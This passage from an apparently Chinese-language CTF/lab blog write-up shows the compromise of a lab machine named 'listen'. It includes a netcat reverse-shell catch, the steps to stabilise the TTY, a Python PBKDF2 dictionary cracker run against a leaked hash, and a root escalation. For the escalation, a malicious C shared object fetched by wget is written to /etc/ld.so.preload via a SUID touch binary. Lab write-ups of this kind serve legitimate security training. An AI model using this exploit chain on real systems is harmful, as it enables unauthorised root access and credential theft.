+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888                                
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.137] 50510
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+</code></pre>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<h1>4.提权</h1>
+<pre class="notranslate"><code class="notranslate">www-data@listen:~/html/wordpress$ ls -al
+total 60
+drwxr-xr-x 2 www-data www-data 4096 Feb  1 21:51 .
+drwxr-xr-x 3 root     root     4096 Jan  7 23:52 ..
+-rw-r--r-- 1 root     root       92 Feb  1 11:13 .2024_12_25_project_web_login_password.bak
+-rw-r--r-- 1 root     root      228 Feb  1 09:50 README.md
+-rw-r--r-- 1 root     root     1783 Feb  1 09:33 album_1.php
+-rw-r--r-- 1 root     root     2004 Feb  1 09:32 album_2.php
+-rw-r--r-- 1 root     root     1861 Feb  1 09:31 album_3.php
+-rw-r--r-- 1 root     root     1781 Feb  1 09:30 album_4.php
+-rw-r--r-- 1 root     root     2057 Feb  1 09:26 album_5.php
+-rw-r--r-- 1 root     root     2359 Feb  1 09:12 home.php
+-rw-r--r-- 1 root     root      315 Feb  1 09:07 index.php
+-rw-r--r-- 1 root     root      219 Feb  1 21:48 pp.php
+-rw-r--r-- 1 root     root     3972 Feb  1 09:23 styles.css
+-rw-r--r-- 1 root     root      675 Feb  1 21:51 test.php
+-rw-r--r-- 1 root     root      153 Feb  1 09:37 tools.php
+www-data@listen:~/html/wordpress$ cat .2024_12_25_project_web_login_password.bak
+pbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028
+
+</code></pre>
+<p>看样子要破解这个hash</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat tmp.py
+import hashlib
+import binascii
+from concurrent.futures import ProcessPoolExecutor, as_completed
+from tqdm import tqdm
+
+def pbkdf2_sha256(password, salt, iterations=50000, dklen=32):
+    """使用PBKDF2-HMAC-SHA256算法计算哈希"""
+    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), iterations, dklen)
+
+def check_password(password_chunk, target_hash, salt, iterations):
+    """检查给定密码块中的每个密码是否匹配目标哈希"""
+    results = []
+    for password in tqdm(password_chunk, desc="Processing chunk", unit="passwords"):
+        password = password.strip()
+        hashed_password = pbkdf2_sha256(password, salt, iterations)
+        if binascii.hexlify(hashed_password).decode() == target_hash:
+            results.append(password)
+    return results
+
+def crack_pbkdf2_hash(target_hash, salt, iterations=50000, dictionary_file='/usr/share/wordlists/rockyou.txt'):
+    """尝试通过字典攻击破解PBKDF2哈希"""
+    chunk_size = 1000  # 每个进程处理的密码数量
+    passwords = []
+    with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as file:
+        while True:
+            password_chunk = list(islice(file, chunk_size))
+            if not password_chunk:
+                break
+            passwords.append(password_chunk)
+
+    with ProcessPoolExecutor() as executor:
+        futures = [executor.submit(check_password, chunk, target_hash, salt, iterations) for chunk in passwords]
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                print(f"找到密码: {result}")
+                return result
+    print("字典中没有找到匹配的密码")
+    return None
+
+if __name__ == '__main__':
+    from itertools import islice
+  
+    target_hash = "0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028"
+    salt = "flower"
+  
+    crack_pbkdf2_hash(target_hash, salt)
+                                                       
+</code></pre>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ python3 tmp.py
+找到密码: ['roseflower']
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ grep -r -w -n "roseflower" /usr/share/wordlists/rockyou.txt                            
+122049:roseflower
+                                   
+</code></pre>
+<p>还挺后</p>
+<pre class="notranslate"><code class="notranslate">www-data@listen:~/html/wordpress$ ls -la /home/
+total 12
+drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
+drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
+drwx------  2 welcome welcome 4096 Feb  1 11:10 welcome
+www-data@listen:~/html/wordpress$ su - welcome
+Password: 
+$ id                                                                                                                                 
+uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
+
+</code></pre>
+<p>继续</p>
+<pre class="notranslate"><code class="notranslate">welcome@listen:~$ ls -al
+total 20
+drwx------ 2 welcome welcome 4096 Feb  1 11:10 .
+-rw-r--r-- 1 root    root      11 Feb  1 11:10 .-
+drwxr-xr-x 3 root    root    4096 Jan  7 23:16 ..
+-rw------- 1 welcome welcome   69 Feb  1 07:13 .bash_history
+-rw-r--r-- 1 root    root      33 Jan  7 23:18 user.txt
+welcome@listen:~$ cat .bash_history
+sudo -l
+cat /etc/passwd
+poweroff
+ls
+whoami
+cd /root
+whoami
+su - root
+welcome@listen:~$ sudo -l
+[sudo] password for welcome: 
+Sorry, user welcome may not run sudo on listen.
+welcome@listen:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/touch
+/usr/bin/su
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+</code></pre>
+<p>/usr/bin/touch是多的，找一下怎么提权吧，找半天也找不到，我就等群u的wp了</p>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203165648-chfb9n8.png"><img src="assets/image-20250203165648-chfb9n8.png" alt="image" style="max-width: 100%;"></a></p>
+<p>过修改 /etc/ld.so.preload 文件实现获得 root 权限，我们跟着实现一下</p>
+<p>查看一下touch命令的so的跟踪流</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ strace touch 2&gt;&amp;1 | grep -Pi "open|access|no such file"
+strace: Symbol `_UPT_accessors' has different size in shared object, consider re-linking
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (没有那个文件或目录)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
+openat(AT_FDCWD, "/usr/share/locale/locale.alias", O_RDONLY|O_CLOEXEC) = 3
+openat(AT_FDCWD, "/usr/share/locale/zh_CN.UTF-8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (没有那个文件或目录)
+openat(AT_FDCWD, "/usr/share/locale/zh_CN.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (没有那个文件或目录)
+openat(AT_FDCWD, "/usr/share/locale/zh_CN/LC_MESSAGES/coreutils.mo", O_RDONLY) = 3
+openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY|O_CLOEXEC) = 3
+
+</code></pre>
+<p>/etc/ld.so.preload 是缺失的，我们去靶机看看</p>
+<pre class="notranslate"><code class="notranslate">welcome@listen:~$ ls -la /etc/ld.so.preload                                                                                          
+ls: cannot access '/etc/ld.so.preload': No such file or directory   
+</code></pre>
+<p>那简单了，我们去创建一个恶意so就好了</p>
+<p>🔗<a href="https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/write-to-root.html" rel="nofollow">https://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/write-to-root.html</a></p>
+<p>在kali创建一个恶意so</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat exp.c 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;  // 包含 unlink(), setuid(), setgid() 等函数
+
+void _init() {
+    // 删除 /etc/ld.so.preload 文件
+    unlink("/etc/ld.so.preload");
+
+    // 提升权限，设置为 root 用户和组
+    setgid(0);    // 设置为 root 组
+    setuid(0);    // 设置为 root 用户
+
+    // 执行 shell（如需要）
+    system("/bin/bash");
+}
+   
+┌──(kali㉿kali)-[~/test]
+└─$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
+                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.205.141 - - [03/Feb/2025 17:31:20] "GET /exp.so HTTP/1.1" 200 -
+
+</code></pre>
+<pre class="notranslate"><code class="notranslate">welcome@listen:/tmp$ wget 192.168.205.128/exp.so
+--2025-02-03 04:31:04--  http://192.168.205.128/exp.so
+Connecting to 192.168.205.128:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14152 (14K) [application/octet-stream]
+Saving to: ‘exp.so’
+
+exp.so                                                       0%[                                                                       exp.so                                                     100%[========================================================================================================================================&gt;]  13.82K  --.-KB/s    in 0s    
+
+2025-02-03 04:31:04 (91.0 MB/s) - ‘exp.so’ saved [14152/14152]
+
+welcome@listen:/tmp$ chmod +x exp.so 
+welcome@listen:/tmp$ umask 000
+welcome@listen:/tmp$ touch /etc/ld.so.preload
+welcome@listen:/tmp$ ls -al /etc/ld.so.preload
+-rw-rw-rw- 1 root root 0 Feb  3 04:31 /etc/ld.so.preload
+welcome@listen:/tmp$ echo "/tmp/exp.so" &gt; /etc/ld.so.preload
+welcome@listen:/tmp$ touch test
+root@listen:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(welcome)
+
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
